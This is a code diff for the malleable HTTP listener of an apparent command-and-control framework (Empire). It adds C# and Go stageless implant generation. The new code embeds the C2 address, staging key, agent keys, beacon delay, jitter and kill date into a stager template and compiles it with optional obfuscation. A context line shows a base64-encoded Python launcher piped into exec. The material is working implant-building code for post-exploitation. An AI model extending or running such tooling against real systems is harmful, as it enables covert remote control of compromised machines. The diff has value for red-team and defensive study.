@@ -272,6 +272,18 @@ class Listener:
 
         return True, None
 
+    def serialize_profile_for_agent(self, profile=None):
+        """Return the base64-encoded JSON malleable profile consumed by
+        runtime interpreters in Sharpire (C#) and Gopire (Go). Accepts an
+        optional pre-deserialized Profile to avoid a redundant deserialize
+        when the caller already has one.
+        """
+        if profile is None:
+            profile = malleable.Profile._deserialize(self.serialized_profile)
+        return base64.b64encode(profile.serialize_for_agent().encode("utf-8")).decode(
+            "utf-8"
+        )
+
     def generate_launcher(
         self,
         encode=True,
@@ -576,8 +588,76 @@ class Listener:
                 return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{launchEncoded}'));\" | python3 &"
             return launcherBase
 
+        if language == "csharp":
+            workingHours = self.options["WorkingHours"]["Value"]
+            killDate = self.options["KillDate"]["Value"]
+            delay = self.options["DefaultDelay"]["Value"]
+            jitter = self.options["DefaultJitter"]["Value"]
+            lostLimit = self.options["DefaultLostLimit"]["Value"]
+
+            # legacy Sharpire profile string (uris|ua|headers) — matches
+            # what generate_agent() passes for the powershell/python paths
+            profileStr = profile.post.client.stringify()
+            malleableProfileB64 = self.serialize_profile_for_agent(profile=profile)
+
+            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
+                encoding=serialization.Encoding.Raw,
+                format=serialization.PrivateFormat.Raw,
+                encryption_algorithm=serialization.NoEncryption(),
+            )
+            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+
+            raw_key_bytes = (
+                self.agent_private_cert_key_object.public_key().public_bytes(
+                    encoding=serialization.Encoding.Raw,
+                    format=serialization.PublicFormat.Raw,
+                )
+            )
+            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
+
+            # SharpireMalleable.yaml pulls in TWO source libraries (Sharpire
+            # base + SharpireMalleable extension) so EmpireCompiler globs both
+            # directories' .cs files into one compilation unit. The malleable
+            # types/interpreter only end up in binaries generated from this
+            # listener — plain http Sharpire stagers skip the extension entirely.
+            stager_yaml = (
+                self.mainMenu.install_path / "stagers/SharpireMalleable.yaml"
+            ).read_text(encoding="utf-8")
+            stager_yaml = (
+                stager_yaml.replace("{{ REPLACE_ADDRESS }}", self.host_address)
+                .replace("{{ REPLACE_STAGINGKEY }}", stagingKey)
+                .replace("{{ REPLACE_PROFILE }}", profileStr)
+                .replace("{{ REPLACE_MALLEABLE_PROFILE }}", malleableProfileB64)
+                .replace("{{ REPLACE_WORKINGHOURS }}", workingHours)
+                .replace("{{ REPLACE_KILLDATE }}", killDate)
+                .replace("{{ REPLACE_DELAY }}", str(delay))
+                .replace("{{ REPLACE_JITTER }}", str(jitter))
+                .replace("{{ REPLACE_LOSTLIMIT }}", str(lostLimit))
+                .replace(
+                    "{{ REPLACE_DEFAULTRESPONSE }}",
+                    base64.b64encode(self.default_response().encode("UTF-8")).decode(
+                        "UTF-8"
+                    ),
+                )
+                .replace("{{ agent_private_cert_key }}", private_key_array)
+                .replace("{{ agent_public_cert_key }}", public_key_array)
+            )
+
+            return str(
+                self.mainMenu.dotnet_compiler.compile_stager(
+                    stager_yaml, "SharpireMalleable", confuse=obfuscate
+                )
+            )
+
+        if language == "go":
+            return str(
+                self.mainMenu.stagergenv2.generate_go_stageless(
+                    self.options, listener_name=listener_name
+                )
+            )
+
         log.error(
-            "listeners/template generate_launcher(): invalid language specification: c# is currently not supported for this module."
+            "listeners/http_malleable generate_launcher(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
         )
         return None
 
@@ -729,8 +809,13 @@ class Listener:
 
             return stager
 
+        if language.lower() in ("csharp", "go"):
+            # csharp (Sharpire) and go (Gopire) are stageless — the compiled
+            # binary produced in generate_launcher() IS the stage.
+            return ""
+
         log.error(
-            "listeners/http_malleable generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+            "listeners/http_malleable generate_stager(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
         )
         return None
 
@@ -826,8 +911,13 @@ class Listener:
 
             return code
 
+        if language in ("csharp", "go"):
+            # csharp (Sharpire) and go (Gopire) are stageless — the agent code
+            # is baked into the compiled launcher binary.
+            return ""
+
         log.error(
-            "listeners/http_malleable generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+            "listeners/http_malleable generate_agent(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
         )
         return None
 
@@ -1308,8 +1398,13 @@ class ExtendedPacketHandler(PacketHandler):
 
             return sendMessage
 
+        if language.lower() in ("csharp", "go"):
+            # csharp (Sharpire) and go (Gopire) are stageless — the comms code
+            # is baked into the compiled launcher binary.
+            return ""
+
         log.error(
-            "listeners/template generate_comms(): invalid language specification, only 'powershell' and 'python' are current supported for this module."
+            "listeners/http_malleable generate_comms(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are currently supported for this module."
         )
         return None
 
